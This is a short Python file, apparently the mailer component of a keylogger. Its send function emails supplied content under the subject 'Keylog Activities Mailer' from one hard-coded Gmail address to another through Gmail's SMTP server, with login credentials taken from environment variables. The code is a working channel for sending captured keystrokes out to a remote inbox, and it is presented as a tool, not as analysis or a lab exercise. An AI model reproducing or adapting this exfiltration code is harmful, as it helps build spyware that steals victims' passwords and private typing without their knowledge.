import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
# from dotenv import load_dotenv, dotenv_values

# configuration for the email
sender_email = "lilraxpa@gmail.com"
receiver_email = 'ameh4dev@gmail.com'
subject = 'Keylog Activities Mailer'
# body = 'content'

# Gmail configuration
gmail_user = os.environ.get('EMAIL_ADDRESS')
gmail_password = os.environ.get('EMAIL_PASSWORD')

def send (content) :
    # Create the email message
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message.attach(MIMEText(content, 'plain'))

    # Establish a connection to the SMTP server (in this case, Gmail's SMTP server)
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        # Start the TLS (Transport Layer Security) connection
        server.starttls()
        
        # Login to the email account
        server.login(gmail_user, gmail_password)
        
        #jjaja Send the email
        server.sendmail(sender_email, receiver_email, message.as_string())

    # print('Email sent successfully!') 